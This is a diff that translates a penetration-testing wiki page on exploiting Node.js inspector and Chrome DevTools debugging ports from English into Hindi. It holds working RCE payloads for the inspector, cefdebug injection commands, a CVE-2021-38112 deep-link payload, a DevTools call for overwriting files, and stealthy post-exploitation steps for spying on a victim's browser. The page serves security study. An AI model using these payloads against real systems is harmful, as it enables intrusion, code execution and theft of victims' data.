@@ -4,15 +4,14 @@
 
 ## Basic Information
 
-[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.
+[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): जब `--inspect` स्विच के साथ शुरू किया जाता है, तो एक Node.js प्रक्रिया एक डिबगिंग क्लाइंट के लिए सुनती है। **डिफ़ॉल्ट** रूप से, यह होस्ट और पोर्ट **`127.0.0.1:9229`** पर सुनती है। प्रत्येक प्रक्रिया को एक **विशिष्ट** **UUID** भी सौंपा जाता है।
 
-Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+इंस्पेक्टर क्लाइंट को कनेक्ट करने के लिए होस्ट पता, पोर्ट और UUID जानना और निर्दिष्ट करना आवश्यक है। एक पूर्ण URL कुछ इस तरह दिखेगा `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।
 
 > [!WARNING]
-> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).
+> चूंकि **डिबगर को Node.js निष्पादन वातावरण तक पूर्ण पहुंच है**, एक दुर्भावनापूर्ण अभिनेता जो इस पोर्ट से कनेक्ट करने में सक्षम है, Node.js प्रक्रिया की ओर से मनमाना कोड निष्पादित करने में सक्षम हो सकता है (**संभावित विशेषाधिकार वृद्धि**).
 
-There are several ways to start an inspector:
-
+इंस्पेक्टर शुरू करने के कई तरीके हैं:
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -23,58 +22,48 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-
-When you start an inspected process something like this will appear:
-
+जब आप एक निरीक्षित प्रक्रिया शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
+**CEF** (**Chromium Embedded Framework**) पर आधारित प्रक्रियाओं को **debugger** खोलने के लिए पैरामीटर का उपयोग करना होगा: `--remote-debugging-port=9222` (SSRF सुरक्षा बहुत समान रहती है)। हालाँकि, वे **NodeJS** **debug** सत्र प्रदान करने के बजाय ब्राउज़र के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके संवाद करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन कोई सीधा RCE नहीं है।
 
-Processes based on **CEF** (**Chromium Embedded Framework**) like need to use the param: `--remote-debugging-port=9222` to open de **debugger** (the SSRF protections remain very similar). However, they **instead** of granting a **NodeJS** **debug** session will communicate with the browser using the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), this is an interface to control the browser, but there isn't a direct RCE.
-
-When you start a debugged browser something like this will appear:
-
+जब आप एक डिबग किए गए ब्राउज़र को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
+### ब्राउज़र्स, वेबसॉकेट्स और समान-स्रोत नीति <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
-
-Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.
+वेबसाइटें एक वेब-ब्राउज़र में वेबसॉकेट और HTTP अनुरोध कर सकती हैं ब्राउज़र सुरक्षा मॉडल के तहत। एक **प्रारंभिक HTTP कनेक्शन** आवश्यक है **एक अद्वितीय डिबगर सत्र आईडी प्राप्त करने के लिए**। **समान-स्रोत नीति** **रोकती है** वेबसाइटों को **इस HTTP कनेक्शन** को बनाने से। [**DNS रीबाइंडिंग हमलों**](https://en.wikipedia.org/wiki/DNS_rebinding)** के खिलाफ अतिरिक्त सुरक्षा के लिए,** Node.js यह सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर** या तो एक **IP पता** या **`localhost`** या **`localhost6`** को सटीक रूप से निर्दिष्ट करते हैं।
 
 > [!NOTE]
-> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).
+> यह **सुरक्षा उपाय निरीक्षक का शोषण करने से रोकता है** कोड चलाने के लिए **बस एक HTTP अनुरोध भेजकर** (जो एक SSRF vuln का शोषण करके किया जा सकता है)।
 
-### Starting inspector in running processes
+### चल रहे प्रक्रियाओं में निरीक्षक शुरू करना
 
-You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.
-
+आप एक चल रहे nodejs प्रक्रिया को **सिग्नल SIGUSR1** भेज सकते हैं ताकि यह **डिफ़ॉल्ट पोर्ट में निरीक्षक शुरू करे**। हालाँकि, ध्यान दें कि आपके पास पर्याप्त विशेषाधिकार होना चाहिए, इसलिए यह आपको **प्रक्रिया के अंदर जानकारी तक विशेषाधिकार प्राप्त पहुंच** दे सकता है लेकिन सीधे विशेषाधिकार वृद्धि नहीं।
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
 > [!NOTE]
-> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.
+> यह कंटेनरों में उपयोगी है क्योंकि **प्रक्रिया को बंद करना और एक नई प्रक्रिया शुरू करना** `--inspect` के साथ **विकल्प नहीं है** क्योंकि **कंटेनर** को प्रक्रिया के साथ **मार दिया जाएगा**।
 
-### Connect to inspector/debugger
+### निरीक्षक/debugger से कनेक्ट करें
 
-To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:
+एक **Chromium-आधारित ब्राउज़र** से कनेक्ट करने के लिए, Chrome या Edge के लिए `chrome://inspect` या `edge://inspect` URLs का उपयोग किया जा सकता है। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **लक्ष्य होस्ट और पोर्ट** सही ढंग से सूचीबद्ध हैं। चित्र एक Remote Code Execution (RCE) उदाहरण दिखाता है:
 
 ![](<../../images/image (674).png>)
 
-Using the **command line** you can connect to a debugger/inspector with:
-
+**कमांड लाइन** का उपयोग करके आप एक debugger/inspector से कनेक्ट कर सकते हैं:
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.
-
+उपकरण [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) स्थानीय रूप से चल रहे **इंस्पेक्टर्स** को **खोजने** और उनमें **कोड** **इंजेक्ट** करने की अनुमति देता है।
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -83,76 +72,67 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 #Exploit it
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
+> [!NOTE]
+> ध्यान दें कि **NodeJS RCE हमले** तब काम नहीं करेंगे जब [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से जुड़े हों (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जांच करनी होगी)।
+
+## NodeJS Debugger/Inspector में RCE
 
 > [!NOTE]
-> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).
+> यदि आप यहाँ [**Electron में XSS से RCE प्राप्त करने का तरीका**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) खोजने आए हैं, तो कृपया इस पृष्ठ की जांच करें।
 
-## RCE in NodeJS Debugger/Inspector
-
-> [!NOTE]
-> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
-
-Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):
-
+जब आप Node **inspector** से **जुड़ सकते** हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके हैं, जैसे कि (ऐसा लगता है कि यह **Chrome DevTools protocol** के साथ कनेक्शन में काम नहीं करेगा):
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
 require("child_process").spawnSync("calc.exe")
 Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ```
-
 ## Chrome DevTools Protocol Payloads
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-In this section I will just list interesting things I find people have used to exploit this protocol.
+आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+इस अनुभाग में मैं केवल उन दिलचस्प चीजों की सूची दूंगा जो मैंने लोगों को इस प्रोटोकॉल का शोषण करते हुए पाई हैं।
 
 ### Parameter Injection via Deep Links
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने खोजा कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में **एक कस्टम UR**I (workspaces://) पंजीकृत किया जो पूर्ण URI प्राप्त करता था और फिर **CEF आधारित एप्लिकेशन को लॉन्च किया** एक ऐसे कॉन्फ़िगरेशन के साथ जो उस URI से आंशिक रूप से निर्मित था।
 
-It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.
+यह पता चला कि URI पैरामीटर URL डिकोड किए गए थे और CEF बेसिक एप्लिकेशन को लॉन्च करने के लिए उपयोग किए गए थे, जिससे एक उपयोगकर्ता को **`--gpu-launcher`** फ्लैग को **कमांड लाइन** में **इंजेक्ट** करने और मनमाने चीजें निष्पादित करने की अनुमति मिली।
 
-So, a payload like:
-
+तो, एक पेलोड जैसे:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
+एक calc.exe को निष्पादित करेगा।
 
-Will execute a calc.exe.
+### फ़ाइलें ओवरराइट करें
 
-### Overwrite Files
-
-Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.
-
+उस फ़ोल्डर को बदलें जहाँ **डाउनलोड की गई फ़ाइलें सहेजी जाएंगी** और एक फ़ाइल डाउनलोड करें ताकि **ओवरराइट** की जा सके अक्सर उपयोग किए जाने वाले **स्रोत कोड** को आपके **दुष्ट कोड** के साथ।
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
 ws.send(
-  JSON.stringify({
-    id: 42069,
-    method: "Browser.setDownloadBehavior",
-    params: {
-      behavior: "allow",
-      downloadPath: "/code/",
-    },
-  })
+JSON.stringify({
+id: 42069,
+method: "Browser.setDownloadBehavior",
+params: {
+behavior: "allow",
+downloadPath: "/code/",
+},
+})
 )
 ```
+### Webdriver RCE और exfiltration
 
-### Webdriver RCE and exfiltration
-
-According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) it's possible to obtain RCE and exfiltrate internal pages from theriver.
+इस पोस्ट के अनुसार: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) RCE प्राप्त करना और theriver से आंतरिक पृष्ठों को exfiltrate करना संभव है।
 
 ### Post-Exploitation
 
-In a real environment and **after compromising** a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the **debugging activated and port-forward the debugging port** so you can access it. This way you will be able to **inspect everything the victim does with Chrome and steal sensitive information**.
+एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को समझौता करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप **debugging सक्रियित करके और debugging port को port-forward करके** एक Chrome प्रक्रिया शुरू कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **विक्टिम द्वारा Chrome के साथ किए गए सभी कार्यों का निरीक्षण कर सकेंगे और संवेदनशील जानकारी चुरा सकेंगे**।
 
-The stealth way is to **terminate every Chrome process** and then call something like
-
+चुपके से करने का तरीका है **हर Chrome प्रक्रिया को समाप्त करना** और फिर कुछ ऐसा कॉल करना जैसे
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
-
-## References
+## संदर्भ
 
 - [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
 - [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
